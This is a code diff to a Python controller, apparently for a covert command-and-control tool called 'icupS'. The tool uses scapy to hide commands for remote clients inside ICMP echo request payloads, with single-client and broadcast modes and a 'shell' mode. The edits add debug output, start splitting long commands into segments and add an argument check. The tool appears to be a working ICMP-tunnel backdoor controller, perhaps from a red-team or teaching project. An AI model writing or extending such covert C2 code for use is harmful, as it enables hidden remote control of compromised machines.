@@ -3,6 +3,7 @@ from scapy.all import ICMP,IP
 import json
 
 DEBUG = True
+DEVDEBUG = True
 JSONFILE = "example.json"
 
 def print_help():
@@ -55,6 +56,14 @@ def send_command(arguments, clients):
         clientcommand = arguments[1] 
         clienttokens = clientcommand.split(" ", 1)
         if clients.get(int(clienttokens[0])) != None:
+
+            if DEVDEBUG: print(len(clienttokens[1].encode('utf-8')))
+            # if len(clienttokens[1].encode('utf-8')) > 1469:
+            #     piece = clienttokens[1][:1469]
+            #     segment = "!!!" + piece 
+            segments = len(clienttokens[1].encode('utf-8'))//1469
+            if DEVDEBUG: print(segments)
+
             evil = IP(dst=clients.get(int(clienttokens[0])))/ICMP(type=8)/(clienttokens[1])
             send(evil)
             if DEBUG: print(f"[DEBUG] \"{clienttokens[1]}\" sent to {clienttokens[0]} at {clients.get(int(clienttokens[0]))}")
@@ -65,10 +74,13 @@ def send_command(arguments, clients):
 
 # Send command to all clients
 def sendtoall(arguments, clients):
-    for client in clients:
-        evil = IP(dst=clients.get(client))/ICMP(type=8)/(arguments[1])
-        if DEBUG: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)}")
-        send(evil)
+    if len(arguments)<2 or arguments[1] == "": 
+        print("[ERROR] Usage: sendtoall <message>")
+    else:
+        for client in clients:
+            evil = IP(dst=clients.get(client))/ICMP(type=8)/(arguments[1])
+            if DEBUG: print(f"[DEBUG] \"{arguments[1]}\" sent to {client} at {clients.get(client)}")
+            send(evil)
 
 # Place icupS into single client mode
 def shell(clients, arguments):
